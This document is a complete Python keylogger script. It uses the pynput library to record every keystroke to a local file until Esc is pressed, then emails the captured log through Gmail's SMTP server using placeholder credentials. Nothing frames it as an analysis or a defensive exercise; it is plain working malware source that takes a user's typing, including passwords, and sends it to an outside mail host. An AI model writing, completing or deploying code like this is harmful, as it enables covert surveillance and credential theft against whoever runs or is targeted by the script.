from pynput import keyboard
import smtplib, ssl

# Email configuration
sender_email = "user@domain.com"  # Replace with your email address
receiver_email = "user@domain.com"  # Replace with the recipient's email address
email_password = "passcode"  # Replace with your email password
smtp_port = 587

# Email message setup
email_message = """From: user@domain.com
To: user@domain.com
Subject: KeyLogs

Text: Keylogs 
"""

def log_keystrokes(text):
    with open("keylogger.txt", 'a') as file:
        file.write(text)

def on_key_press(key):
    try:
        if key == keyboard.Key.enter:
            log_keystrokes("\n")
        else:
            log_keystrokes(key.char)
    except AttributeError:
        if key == keyboard.Key.backspace:
            log_keystrokes("\nBackspace Pressed\n")
        elif key == keyboard.Key.tab:
            log_keystrokes("\nTab Pressed\n")
        elif key == keyboard.Key.space:
            log_keystrokes(" ")
        else:
            log_entry = repr(key) + " Pressed.\n"
            log_keystrokes(log_entry)
            print(f"\n{key} Pressed\n")

def on_key_release(key):
    # Stops the listener when 'esc' key is pressed
    if key == keyboard.Key.esc:
        return False

# Start listening for key events
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

# Read the log file and prepare the email message
with open("keylogger.txt", 'r') as file:
    log_content = file.read()
    email_message += str(log_content)

# Send the email with the key logs
context = ssl.create_default_context()
server = smtplib.SMTP('smtp.gmail.com', smtp_port)
server.starttls()
server.login(sender_email, email_password)
server.sendmail(sender_email, receiver_email, email_message)
print(f"Email Sent to {receiver_email}")
server.quit()
